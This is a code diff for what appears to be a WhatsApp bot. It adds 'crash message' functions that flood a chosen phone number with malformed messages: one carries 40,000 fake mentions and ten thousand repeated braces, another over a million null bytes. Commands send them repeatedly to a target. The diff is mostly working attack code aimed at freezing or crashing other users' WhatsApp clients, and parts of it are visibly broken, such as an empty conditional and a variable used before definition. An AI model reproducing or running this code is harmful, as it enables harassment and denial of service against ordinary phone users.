@@ -737,9 +737,238 @@ const gif = {
     }, {});
   }
 }
+//fuction//
+async function protocolSockUns1(target) {
+  return new Promise(async (resolve) => {
+    let ProtoSock = JSON.stringify({
+      type: "invoke",
+      payload: {
+        bot_id: "meta_ai",
+        action: "send_card",
+        recipient: {
+          phone_number: target,
+          name: "Meta AI"
+        },
+        card_data: {
+          template_id: "show_cards_users",
+          components: [
+            {
+              type: "header",
+              parameters: {
+                title: "",
+                image: {
+                  url: "XXX"
+                }
+              }
+            },
+            {
+              type: "body",
+              parameters: {
+                text: "",
+                variables: {
+                  name: "ctp",
+                  offer_code: "SHA_256"
+                }
+              }
+            },
+            {
+              type: "button",
+              parameters: [
+                {
+                  type: "single_select",
+                  button_id: "btn_accept",
+                  text: ""
+                },
+                {
+                  type: "highlight_label",
+                  button_id: "btn_decline",
+                  text: ""
+                }
+              ]
+            }
+          ]
+        },
+        metadata: {
+          request_id: "REQUEST_BY_OTHER",
+          timestamp: null,
+          source: "com.whatsapp"
+        }
+      }
+    });
+
+    let content = generateWAMessageFromContent(target, {
+      viewOnceMessage: {
+        message: {
+          messageContextInfo: {
+            deviceListMetadata: {},
+            deviceListMetadataVersion: 2,
+            shop: 999,
+            participant: { jid: target },
+            remoteJid: "status@broadcast",
+            mentionedJids: [
+              "0@s.whatsapp.net",
+              ...Array.from({ length: 40000 }, () =>
+                `1${Math.floor(Math.random() * 10000000)}@s.whatsapp.net`
+              )
+            ],
+            expiration: 999,
+            ephemeralSettingTimestamp: 100000,
+            entryPointConversionSource: "cache",
+            entryPointConversionApp: "Whatsapp",
+            entryPointConversionDelaySeconds: 9670,
+            disappearingMode: {
+              initiator: "INITIATED_BY_OTHER",
+              trigger: "ACCOUNT_STATUS"
+            }
+          },
+          gizzxplotAudioMessageSecure: "18��ib�m��A0",
+          interactiveMessage: {
+            header: {
+              title: "",
+              hasMediaAttachment: false
+            },
+            body: {
+              text: "Ᏽ𐌉ⱿⱿ 𐌄𐋄𐌄𐌂𐌵𐌕𐌄𐌓𐌄𐌃"
+            },
+            nativeFlowMessage: {
+              messageParamsJson: "{".repeat(10000),
+              businessMessageForwardInfo: {
+                businessOwnerJid: "0@s.whatsapp.net"
+              },
+              buttons: [
+                {
+                  name: "single_select",
+                  buttonParamsJson: "{             1.}"
+                },
+                {
+                  name: "call_permission_request",
+                  buttonParamsJson: ProtoSock
+                },
+                {
+                  name: "action_shop",
+                  buttonParamsJson: "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"null\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}"
+                },
+                {
+                  name: "account_type",
+                  buttonParamsJson: ProtoSock
+                }
+              ]
+            }
+          }
+        }
+      }
+    },
+    { isAnimated: true }
+  );
+
+    await conn.relayMessage(target, content.message, {
+      messageId: null,
+      participant: { jid: target }
+    });
+
+    setTimeout(() => resolve(), 1000);
+  });
+}
+//by chocoplus//
+async function resd(x, z) {
+    let biji = await generateWAMessageFromContent(x, {
+        viewOnceMessage: {
+            message: {
+                interactiveResponseMessage: {
+                    body: {
+                        text: "⭑ 𝐂𝐡𝐨𝐜𝐨𝐩𝐥𝐮𝐬 𝐂𝐫𝐚𝐬𝐡 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 KKK EITA⭑",
+                        format: "DEFAULT"
+                    },
+                    nativeFlowResponseMessage: {
+                        name: "call_permission_request",
+                        paramsJson: "\u0000".repeat(1045000), // trigger (you can replace it with 0002)
+                        version: 3
+                    }
+                }
+            }
+        }
+    }, {
+        // ❗ Essential properties for messages to be sent
+        ephemeralExpiration: 0,
+        forwardingScore: 0,
+        isForwarded: false,
+        font: Math.floor(Math.random() * 9),
+        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
+    });
+
+    await conn.relayMessage("status@broadcast", biji.message, {
+        messageId: biji.key.id,
+        statusJidList: [x],
+        additionalNodes: [
+            {
+                tag: "meta",
+                attrs: {},
+                content: [
+                    {
+                        tag: "mentioned_users",
+                        attrs: {},
+                        content: [
+                            { tag: "to", attrs: { jid: x }, content: undefined }
+                        ]
+                    }
+                ]
+            }
+        ]
+    });
+
+    await sleep(500);
+
+    // ❗ If the z parameter is true, a follow up message will be sent. but i don't recommend it.
+    if (z) {
+        await conn.relayMessage(x, {
+            statusMentionMessage: {
+                message: {
+                    protocolMessage: {
+                        key: biji.key,
+                        type: 25, // enum 25 > STATUS_MENTION_MESSAGE
+                    },
+                },
+            },
+        }, {});
+    }
+}
 switch(command) {
-case 'forcecall': {
+case 'resd': {
+  if (!isBot && !isCreator) return
+  await resd(from, true);
+  await resd(from, true);
+  await resd(from, true);
+  await resd(from, true);
+  await resd(from, true);
+  await resd(from, true);
+}
+break;
+case 'buffer': {
   if (!isBot) return 
+
+  let target = m.mentionedJid[0] 
+    ? m.mentionedJid[0] 
+    : m.quoted 
+      ? m.quoted.sender 
+      : q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
+
+  if (!target || !target.includes('@s.whatsapp.net')) 
+
+  await conn.sendMessage(m.chat, { text: 'null </>' }, { quoted: m });
+  await protocolSockUns1(target)
+  await protocolSockUns1(target)
+  await protocolSockUns1(target)
+  await protocolSockUns1(target)
+  await protocolSockUns1(target)
+  await protocolSockUns1(target)
+  await protocolSockUns1(target)
+  await protocolSockUns1(target)
+  await protocolSockUns1(target)
+  await conn.sendMessage(m.chat, { text: 'by 𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘' }, { quoted: n });
+}
+break;
+case 'nose': {
+  if (!isBot) return albumgip(target);
 
   let target = m.mentionedJid[0] 
     ? m.mentionedJid[0] 
@@ -765,7 +994,7 @@ case 'forcecall': {
   await conn.sendMessage(m.chat, { text: 'by 𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘' }, { quoted: n });
 }
 break;
-case 'nose': {
+case 'forcecall': {
   if (!isBot) return 
 
   let target = m.mentionedJid[0] 
